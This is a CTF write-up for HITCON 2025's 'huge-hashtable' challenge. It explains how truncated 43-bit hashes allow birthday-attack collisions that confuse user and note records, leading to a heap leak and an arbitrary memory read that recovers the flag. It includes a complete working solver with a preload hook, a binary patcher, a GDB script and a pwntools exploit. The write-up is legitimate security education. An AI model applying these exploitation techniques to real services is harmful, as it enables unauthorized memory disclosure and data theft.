---
title: HITCON 2025 Write-Up
categories: CTF
comment: true
---

# huge-hashtable (Upsolving)

- tag: reversing
- solved: 2

## Overview

Although categorized under the reversing tag, the challenge actually involved a considerable amount of pwnable and cryptography. Solving it purely through reverse engineering would have required, on average, about 2^43 hash computations. To bring this down to around 2^22 using a birthday attack, we had to trigger vulnerabilities in the challenge binary and make use of a heap address leak along with an Arbitrary Address Read (AAR).

In theory, if the AVX-optimized hash computations had been offloaded to a GPU via CUDA (or something similar), performing 2^43 operations might have been feasible. In practice, however, I gave up during the competition after attempting to port the hash function to CUDA for analysis.

All in all, it was an interesting challenge, but I feel it should at least have carried a *pwnable* tag.

This write-up was created during the upsolving phase and is more of a retrospective, reflecting on the thought process that should have been taken to solve the challenge and whether it was appropriate. With that said, let’s get started.

## Binary Analysis

Now, let’s take a closer look at the structure of the binary.

Aside from the AVX-optimized `hash()` function, reversing this binary was fairly straightforward — simply reading throught the C code produced by IDA was enough to understand most of the logic.

Below is the decompiled result of `main()` (with functions and variables appropriately renamed and retyped).

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  struct ctx *inited; // rax
  struct ctx *ctx; // rbp
  char *v5; // rax
  char *flag_str; // rax
  struct user_record *user_info; // rbx
  int option; // [rsp+4h] [rbp-24h] BYREF
  unsigned __int64 v10; // [rsp+8h] [rbp-20h]

  v10 = __readfsqword(0x28u);
  initialize();
  inited = init_struct();
  if ( !inited
    || (ctx = inited, v5 = getenv("FLAG"), flag_str = strdup(v5), !note_insert(ctx, "flag", flag_str, "none")) )
  {
    exit(1);
  }
  user_info = 0LL;
  __printf_chk(1LL, "Welcome! The current time is %lu.%09lu.\n", tp.tv_sec, tp.tv_nsec);
LABEL_4:
  if ( !user_info )
    goto LABEL_11;
  while ( 1 )
  {
    puts("1) create note");
    puts("2) read note");
    puts("3) logout");
    __printf_chk(1LL, "Action: ");
    if ( (unsigned int)__isoc23_scanf("%d", &option) != 1 )
      return 0LL;
    switch ( option )
    {
      case 2:
        read_note(ctx, user_info);
        break;
      case 3:
        __printf_chk(1LL, "Bye %s\n", user_info->username);
LABEL_11:
        while ( 1 )
        {
          puts("1) register");
          puts("2) login");
          puts("3) bye");
          __printf_chk(1LL, "Action: ");
          if ( (unsigned int)__isoc23_scanf("%d", &option) != 1 )
            return 0LL;
          switch ( option )
          {
            case 2:
              user_info = login(ctx);
              goto LABEL_4;
            case 3:
              puts("Bye");
              exit(0);
            case 1:
              register((__int64)ctx);
              break;
            default:
              puts("Unknown action");
              break;
          }
        }
      case 1:
        create_node(ctx, (__int64)user_info);
        break;
      default:
        puts("Unknown action");
        break;
    }
  }
}
```

As you can probably tell from the challenge title and the `main()` function, this binary implements a hash table.

When registering, the username and password are provided, and the information is stored with the hash of `f"user-{username};"` as the key. This stored user information is then used each time a login occurs.

After login in with the registered username and password, creating a note stores its content with the hash of `f"note-{password}-{title};"` as the key. Notes stored in this way can be read using the `read_note` feature.

## Checking Hash Collision Possibilities

```c
  v8 = ((__int64 (__fastcall *)(__int64, __int64))hash_table->func_table.hash_ptr)(a2, a3);
  page_size = hash_table->page_size;
  v11 = (__int64 *)((char *)hash_table->arena_base + 8 * (hash_table->limit_mask & v8));
  *v11 = a4;
```

Looking at the code above, the return value of `hash()` is masked with `limit_mask`, which is 0x7FFFFFFFFFF. In other words, the hash length is 43 bits — small enough to allow collision to occur with reasonable probability. 

Although the flag is stored under `note-node-flag;` and the password cannot be set to `none` — meaning that reading the flag would require about 2^43 hash computations — for everythin else, since the plaintext can be freely chosen before hashing, collision between users, between notes, or even between a user and a note can be achieved with only around 2^22 hash computations (by birthday attack).

Perhaps, if the hash function were ported to the GPU, it might be possible to generate a direct collision with the flag and read the note where it is stored… However, since analyzing the AVX-optimized function is not straightforward, I instead focused on exploring what could realistically be achieved with around 2^22 hash computations by using the already-implemented `hash()` as it.

## Vulnerabilities (Heap leak, AAR)

The hash table stores not only user data but also note information. Therefore, if a collision pair is found between `f"user-{username};` and `f"note-{password}-{title};`, it becomes possible to disguise user information as note information, or conversely, to disguise note information as user information.

Below are the structures for the user data and note information stored in the hash table.

```c
struct user_record
{
  char username[16];
  char password[16];
};

struct note
{
  __int64 title;
  __int64 title_len;
  __int64 content_len;
  __int64 content;
};
```

When login, the `username` field is printed, and when using the `read_note` feature, the `title` and `content` are printed. Therefore, after finding a collision pair, if you log in as a note, the `title` field — which resides at the same offset as `username` — will be leaked (at this point, the `title` field is a pointer to the heap region where the title is stored). Conversely, if you use the `read_note` feature with a collision pair corresponding to user data, the note’s `content` field is actually a pointer, so you can read the data located at the address corresponding to the last 8 bytes of the 16-byte password.

The actual flag is stored in the heap section, so by combining a heap leak with an Arbitrary Address Read(AAR), it can be retrieved.

## Hooking `hash()` for a Birthday Attack

With the attack scenario fully laid out, let’s move on to actually retrieving the flag.

To perform a heap leak and an AAR, we first need to find a hash collision pair — but interpreting the AVX code is no easy task. So, let’s start by taking a quick look at what the function looks like.

```c
unsigned __int64 hash_sub1()
{
  int v0; // r8d
  int v1; // r14d
  int v35; // r9d
  __int64 v37; // r10
  int v39; // edx
  int v40; // eax
  unsigned __int64 result; // rax
  int v152; // [rsp+10h] [rbp-258h]
  __m256 v153; // [rsp+20h] [rbp-248h] BYREF
  unsigned __int64 v169; // [rsp+238h] [rbp-30h]

  v0 = 6;
  v1 = 1;
  __asm
  {
    vmovdqa ymm8, cs:ymmword_8160
    vmovdqa ymm9, cs:ymmword_8180
  }
  v169 = __readfsqword(0x28u);
  __asm
  {
    vmovdqa ymm10, cs:ymmword_81A0
    vmovdqa ymm11, cs:ymmword_81C0
  }
  _R15 = &v153;
  __asm
  {
    vmovdqa ymm7, cs:ymmword_8260
    vmovdqa ymm6, cs:ymmword_8280
    vmovdqa cs:ymmword_8260, ymm8
    vmovdqa ymm5, cs:ymmword_82A0
    vmovdqa ymm4, cs:ymmword_82C0
    vmovdqa cs:ymmword_8280, ymm9
    vmovdqa ymm3, cs:ymmword_82E0
    vmovdqa ymm2, cs:ymmword_8300
    vmovdqa cs:ymmword_82A0, ymm10
    vmovdqa ymm1, cs:ymmword_8320
    vmovdqa ymm0, cs:ymmword_8340
    vmovdqa cs:ymmword_82C0, ymm11
    vmovdqa ymm13, cs:ymmword_8200
    vmovdqa ymm14, cs:ymmword_8220
    vmovdqa ymm15, cs:ymmword_8240
    vmovdqa ymm12, cs:ymmword_81E0
    vpxor   ymm7, ymm7, cs:ymmword_8160
    vpxor   ymm6, ymm6, cs:ymmword_8180
    vmovdqa cs:ymmword_8300, ymm13
    vpxor   ymm5, ymm5, cs:ymmword_81A0
    vpxor   ymm4, ymm4, cs:ymmword_81C0
    vmovdqa cs:ymmword_8320, ymm14
    vpxor   ymm3, ymm3, cs:ymmword_81E0
    vpxor   ymm2, ymm2, cs:ymmword_8200
    vmovdqa cs:ymmword_8340, ymm15
    ...
    ...
    ...
  }
```

To port the hash to the GPU, we would first need to analyze and fully understand its behavior. However, since around 2^22 computations are still feasible on the CPU, it is sufficient to simply reuse the already well-implemented hash function. In particular, by leveraging a DLL for hooking, the function from the binary can be used directly in a higher-level language like C/C++ within a single process, at native speed, without relying on inter-process communication or debugging events.

The idea is very simple. On Linux, the executable image base can also be obtained from within a DLL using the following code.

```c
uintptr_t main_base;
static int cb(struct dl_phdr_info* info, size_t sz, void* data) {
    if (!info->dlpi_name || !*info->dlpi_name) {
        *(uintptr_t*)data = info->dlpi_addr;
        return 1;
    }
    return 0;
}

dl_iterate_phdr(cb, &main_base);
```

Since we know the RVA of `hash()`, we can easily obtain its address and call it.

As shown below, during initialization, the constants required for hashing are initialized based on the current time’s nanoseconds. Therefore, to align the conditions of the server’s hash function with the local hash function, additional measures are necessary.

```c
unsigned __int64 initialize()
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  if ( clock_gettime(0, &tp) )
    exit(1);
  return init_global(tp.tv_nsec + 1000000000 * tp.tv_sec);
}
```

To do this, we need to manipulate the local process to match the nanoseconds received from the server and execute the initialization function of the actual binary.

This process was resolved using a gdb script and installing inline hooks into the binary. After solving the challenge, I realized that hooking the initialization function using the same method as hooking the `hash()` would have been a simpler solution.

It took approximately 1m 30s to 10m to obtain a single collision pair.

```c
[+] Collision found
	hash43 - 0x18ae0bba71a
	user-kca0sobjdqq83nv;
  note-aqosmmawo1z-q2cvs3vly9xtz;
  prebuilt(M)-2097152, streamed(K)=525300
  time: build=75.887s, stream=21.997s, total=97.884s
```

## Full Attack Scenario

Let’s outline the entire attack flow.

1. Find hash collision pairs between users and notes.
2. Create a note corresponding to the found collision pair.
3. Log out and log in as the user corresponding to the found collision pair. During login, the heap address pointing to the collision pair note’s title will leak.
4. Calculate the address where the flag is located using this leaked address.
5. Use the last 6 bytes of the password’s 14 bytes to form a new address and find another hash collision pair.
6. Log in as the user from the collision pair found in step 5.
7. Reading the note corresponding to this collision pair will reveal the flag.

## Solver

These are the complete solver codes that successfully executed actual Docker attacks.

`bf.cpp` : Hook binary’s `hash()` function & Brute-force hash collision pairs using the birthday problem

```cpp
#define _GNU_SOURCE
#include <dlfcn.h>
#include <link.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <atomic>
#include <string>
#include <unordered_map>
#include <random>
#include <thread>
#include <vector>
#include <iostream>

#ifndef PATCH_RVA
# error "PATCH_RVA not defined."
#endif

uintptr_t main_base;
static int cb(struct dl_phdr_info* info, size_t sz, void* data) {
    if (!info->dlpi_name || !*info->dlpi_name) {
        *(uintptr_t*)data = info->dlpi_addr;
        return 1;
    }
    return 0;
}

void find_collision(void);

using hash_fn_t = uint64_t(*)(char*, size_t);
static constexpr uint64_t MASK43 = ((1ULL<<43) - 1);
static constexpr uintptr_t HASH_RVA = 0x3960;

static size_t PREBUILD_M = (1u<<21);
static size_t MAX_LEN = 15;
static const char* ALPH = "abcdefghijklmnopqrstuvwxyz1234567890";

static std::atomic<bool> started{false};

static std::string to_hex(const std::string& s){
    static const char* hex = "0123456789abcdef";
    std::string out; out.reserve(s.size()*2);
    for (unsigned char c: s){ out.push_back(hex[c>>4]); out.push_back(hex[c&0xF]); }
    return out;
}

static std::mt19937_64& rng() {
    static thread_local std::mt19937_64 r{std::random_device{}()};
    return r;
}

static std::string rand_token(size_t max_len = MAX_LEN) {
    std::uniform_int_distribution<size_t> len_dist(9, max_len);
    std::uniform_int_distribution<size_t> ch_dist(0, strlen(ALPH) - 1);
    size_t L = len_dist(rng());
    std::string s; s.reserve(L);
    for (size_t i=0;i<L;i++) s.push_back(ALPH[ch_dist(rng())]);
    return s;
}

static inline uint64_t H(hash_fn_t f, const char* p, size_t n) {
    return f((char*)p, n) & MASK43;
}

static void patch_imm64(void *where, uint64_t value) {
    long ps = sysconf(_SC_PAGESIZE);
    void *page = (void*)((uintptr_t)where & ~(uintptr_t)(ps - 1));

    if (mprotect(page, ps, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
        perror("mprotect");
        return;
    }
    *(uint64_t*)where = value;
    mprotect(page, ps, PROT_READ | PROT_EXEC);
}

void find_collision(void) {
    hash_fn_t HF = (hash_fn_t)(main_base + HASH_RVA);

    uint64_t aar_addr = 0;
    printf("AAR address: ");
    scanf("%ld", &aar_addr);

    const char* test = "note-none-flag;";
    uint64_t hash = H(HF, test, strlen(test));

    const char* test1 = "user-mini-chip;";
    uint64_t hash1 = H(HF, test1, strlen(test1));
    fprintf(stderr, "[shim] test-hash : %lx\n", (unsigned long)hash);
    fprintf(stderr, "[shim] test-hash1: %lx\n", (unsigned long)hash1);

    // 1) user-%s; 구성
    std::unordered_map<uint64_t, std::string> table;
    table.reserve(PREBUILD_M * 2);

    std::vector<char> buf1(5 + MAX_LEN + 1); // "user-" + string + ";"
    size_t built = 0;

    auto t0 = std::chrono::steady_clock::now();
    while (built < PREBUILD_M) {
        std::string s = rand_token(MAX_LEN);
        size_t n = 0;
        memcpy(&buf1[n], "user-", 5); n += 5;
        memcpy(&buf1[n], s.data(), s.size()); n += s.size();
        buf1[n++] = ';';

        uint64_t hv = H(HF, buf1.data(), n);

        table.emplace(hv, std::move(s));
        ++built;
    }
    auto t1 = std::chrono::steady_clock::now();

    // 2) note-%s-%s; 스트리밍 탐색
    std::vector<char> buf2(5 + MAX_LEN + 1 + MAX_LEN + 1);
    size_t tried = 0;
    while (true) {
        std::string b = rand_token(MAX_LEN);
        std::string a;
        if (aar_addr == 0) {
            a = rand_token(MAX_LEN);    
        }
        else {
            a = "01234567";
            for (int i = 0; i < 6; i++) {
                a.push_back(reinterpret_cast<char*>(&aar_addr)[i]);
            }
        }

        size_t n = 0;
        memcpy(&buf2[n], "note-", 5); n += 5;
        memcpy(&buf2[n], a.data(), a.size()); n += a.size();
        buf2[n++] = '-';
        memcpy(&buf2[n], b.data(), b.size()); n += b.size();
        buf2[n++] = ';';

        uint64_t hv = H(HF, buf2.data(), n);
        auto it = table.find(hv);
        if (it != table.end()) {
            auto t2 = std::chrono::steady_clock::now();

            double t_build = std::chrono::duration<double>(t1 - t0).count();
            double t_stream = std::chrono::duration<double>(t2 - t1).count();
            double total = std::chrono::duration<double>(t2 - t0).count();

            std::string user_hex = to_hex(it->second);
            std::string pw_hex = to_hex(a);
            std::string title_hex = to_hex(b);
            

            fprintf(stderr,
                "\n[+] Collision found\n"
                "\thash43 - 0x%llx\n"
                "\tuser: %s\n"
                "\tpw: %s\n"
                "\ttitle: %s\n"
                "\tprebuilt(M)-%zu, streamed(K)=%zu\n"
                "\ttime: build=%.3fs, stream=%.3fs, total=%.3fs\n",
                (unsigned long long)hv,
                user_hex.c_str(), pw_hex.c_str(), title_hex.c_str(),
                built, tried+1, t_build, t_stream, total);
            fflush(stderr);
            exit(0);
        }

        ++tried;
        if ((tried & ((1<<20)-1)) == 0) {
            fprintf(stderr, "[.] tried=%zu...\n", tried);
        }
    }

    return;
}

__attribute__((constructor))
static void init_shim(void) {
    dl_iterate_phdr(cb, &main_base);
    fprintf(stderr, "[shim] base = 0x%lx\n", (unsigned long)main_base);

    uint8_t* imm = (uint8_t*)(main_base + (uintptr_t)PATCH_RVA + 2);
    patch_imm64(imm, (uint64_t)(void*)&find_collision);
    fprintf(stderr, "[shim] patched call target -> find_collision@%p\n", (void*)&find_collision);
}
```

`patcher.py` : Patch `chal` binary to install inline hook

```python
import sys
import lief

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 patch.py <binary path> <patch RVA>")
        exit()
    
    bin_path = sys.argv[1]
    rva = int(sys.argv[2], 0)

    elf = lief.parse(bin_path)
    code = bytearray(b"\x48\xb8" + 0xDEADBEEFCAFEBABE.to_bytes(8, "little") + b"\xff\xe0")

    elf.patch_address(rva, list(code))
    out = bin_path + ".patched"
    
    builder = lief.ELF.Builder(elf)
    builder.build()
    builder.write(out)
```

`Makefile`

```makefile
TARGET      ?= ./chal
PATCH_RVA   ?= 0x11CD      
SHIM        ?= bf.so

CXX         := g++
CFLAGS_SO   ?= -shared -fPIC -O2 -std=c++17 -pthread -mstackrealign
LDLIBS_SO   ?= -ldl

PYTHON      ?= python3
PATCHER     ?= patch.py

.PHONY: all build patch run clean

all: build patch

build: $(SHIM)

$(SHIM): bf.cpp
	$(CXX) $(CFLAGS_SO) -DPATCH_RVA=$(PATCH_RVA) -o $@ $< $(LDLIBS_SO)

patch: $(TARGET) $(PATCHER)
	$(PYTHON) $(PATCHER) $(TARGET) $(PATCH_RVA)

run: all
	LD_PRELOAD=$(PWD)/$(SHIM) $(TARGET)

clean:
	rm -f $(SHIM)
	rm -f $(TARGET).patched
```

`set_clock_time.py` : A GDB Python script that controls the initialization of the hash structure to match the server environment

```python
import gdb

ge = gdb.execute
gp = gdb.parse_and_eval

IMAGE_BASE = 0x555555554000

class set_clock_time(gdb.Breakpoint):
    def __init__(self, rdi: int):
        super(set_clock_time, self).__init__(spec=f"*{IMAGE_BASE + 0x1E84}")
        self.rdi = rdi
    
    def stop(self):
        ge(f"set $rdi={self.rdi}")
        return False

clock_time = int(input("clock_time: "), 0)
set_clock_time(clock_time)

ge("set environment LD_PRELOAD ./bf.so")
ge("run")
```

`solver.py` : A pwntools script that bundles the entire attack process into one

```python
from pwn import *
import os

context.log_level = "debug"

def get_collision(clock_num: int, aar_addr: int=0):
    col_solver = process(["gdb", "-q", "-batch", "-x", "set_clock_time.py", "./chal.patched"])
    col_solver.sendline(str(clock_num).encode())

    col_solver.sendlineafter(b'AAR address: ', str(aar_addr).encode())

    col_solver.recvuntil(b"[+] Collision found\n")
    
    col_solver.recvuntil(b"user: ")
    user = bytes.fromhex(col_solver.recvline().strip().decode())

    col_solver.recvuntil(b"pw: ")
    pw = bytes.fromhex(col_solver.recvline().strip().decode())

    col_solver.recvuntil(b"title: ")
    title = bytes.fromhex(col_solver.recvline().strip().decode())

    # context.log_level = "critical"
    return user, pw, title

if __name__ == "__main__":
		p = remote("localhost", 50087)

    p.recvuntil(b"Welcome! The current time is ")
    nums = p.recvline().decode().split(".")
    clock_time = int(nums[0]) * 1000000000 + int(nums[1])

    print(clock_time)

    user, pw, title = get_collision(clock_time)

    # register
    p.sendlineafter(b"Action: ", str(1).encode())
    p.sendlineafter(b"Username: ", b"TEST")
    p.sendlineafter(b"Password: ", pw)

    # login
    p.sendlineafter(b"Action: ", str(2).encode())
    p.sendlineafter(b"Username: ", b"TEST")
    p.sendlineafter(b"Password: ", pw)

    # create node
    p.sendlineafter(b"Action: ", str(1).encode())
    p.sendlineafter(b"Title: ", title)
    p.sendlineafter(b"Content Length: ", str(0x40).encode())
    p.sendlineafter(b"Content: ", b"0123456789abcdef"*4)

    # logout
    p.sendlineafter(b"Action: ", str(3).encode())

    # login
    p.sendlineafter(b"Action: ", str(2).encode())
    p.sendlineafter(b"Username: ", user)
    p.sendlineafter(b"Password: ", b"@")

    p.recvuntil(b"Hello, ")
    heap_leaked = u64(p.recvn(6) + b"\x00\x00")
    flag_addr = heap_leaked - 336

    # logout
    p.sendlineafter(b"Action: ", str(3).encode())

    user, pw, title = get_collision(clock_time, flag_addr)

    # register
    p.sendlineafter(b"Action: ", str(1).encode())
    p.sendlineafter(b"Username: ", user)
    p.sendlineafter(b"Password: ", pw)

    # login
    p.sendlineafter(b"Action: ", str(2).encode())
    p.sendlineafter(b"Username: ", user)
    p.sendlineafter(b"Password: ", pw)

    # read note
    p.sendlineafter(b"Action: ", str(2).encode())
    p.sendlineafter(b"Title: ", title)

    p.interactive()
```